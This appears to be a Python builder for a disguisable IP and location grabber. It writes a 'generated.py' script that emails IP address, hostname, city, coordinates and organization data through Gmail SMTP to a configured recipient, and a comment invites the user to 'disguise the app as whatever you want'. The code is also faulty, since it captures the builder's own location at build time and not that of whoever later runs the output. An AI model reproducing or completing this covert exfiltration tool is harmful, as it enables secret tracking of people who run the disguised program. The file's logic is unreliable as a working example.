import requests
import json
from sys import argv, exit
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Before you start, go to https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4O13KGBUwF9HwEI0q6D634Jj7VWs9WEG4fnoJhshHctblM9kwofamyR0lqEjekUtfJ9PWn8O73_1ywEhFwVaYVhsV-_Pg\nand enable less secure apps. When finished, click enter in the console.

print('Loading...')
r = requests.get('https://ipinfo.io')
ipinfo = r.json()


def findinfo(data):
    msg = ''
    if '-i' in data['args']:
        msg = msg + 'IP ' + ipinfo['ip'] + ','
    if '-h' in data['args']:
        msg = msg + 'HOSTNAME ' + ipinfo['hostname'] + ','
    if '-c' in data['args']:
        msg = msg + 'CITY ' + ipinfo['city'] + ','
    if '-r' in data['args']:
        msg = msg + 'REGION ' + ipinfo['region'] + ','
    if '-co' in data['args']:
        msg = msg + 'COUNTRY ' + ipinfo['country'] + ','
    if '-l' in data['args']:
        msg = msg + 'LATITUDE, LONGITUDE LOCATION ' + ipinfo['loc'] + ','
    if '-o' in data['args']:
        msg = msg + 'ORGANIZATION ' + ipinfo['org'] + ','
    if '-t' in data['args']:
        msg = msg + 'TIMEZONE ' + ipinfo['timezone'] + ','
    if '-a' in data['args']:
        msg = msg + 'IP ' + ipinfo['ip'] + ',' + 'HOSTNAME ' + ipinfo['hostname'] + ',' + 'CITY ' + ipinfo['city'] + ',' + 'REGION ' + ipinfo['region'] + ',' + 'COUNTRY ' + \
            ipinfo['country'] + ',' + 'LATITUDE, LONGITUDE LOCATION ' + ipinfo['loc'] + ',' + \
            'ORGANIZATION ' + ipinfo['org'] + ',' + \
            'TIMEZONE ' + ipinfo['timezone']

    return msg


sender_email = ''
sender_password = ''
recv_email = ''
message = ''
subject = ''

with open('config.json') as f:
    data = json.load(f)
    sender_email = data['sender_email']
    sender_password = data['sender_password']
    recv_email = data['recv_email']
    subject = data['subject']
    message = findinfo(data)

msg = MIMEMultipart()
msg['Subject'] = subject
msg['From'] = sender_email
msg['To'] = recv_email
msg.attach(MIMEText(message))

# port = 465


# context = ssl.create_default_context()


# with smtplib.SMTP_SSL('smtp.gmail.com', port, context=context) as server:
#     server.login(sender_email, sender_password)
#     server.sendmail(sender_email, recv_email, msg.as_string())

with open('generated.py', 'w') as f:
    filedata = f'''
# coding: ISO-8859-1
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import ssl
import smtplib

sender_email = '{sender_email}'
sender_password = '{sender_password}'
recv_email = '{recv_email}'
subject = '{subject}'
message = '{message}'

msg = MIMEMultipart()
msg['Subject'] = subject
msg['From'] = sender_email
msg['To'] = recv_email
msg.attach(MIMEText(message))


port = 465

context = ssl.create_default_context()

with smtplib.SMTP_SSL('smtp.gmail.com', port, context=context) as server:
    server.login(sender_email, sender_password)
    server.sendmail(sender_email, recv_email, msg.as_string())

# Disguise the app as whatever you want down below |
#                                                 \ /
    '''
    f.write(filedata)
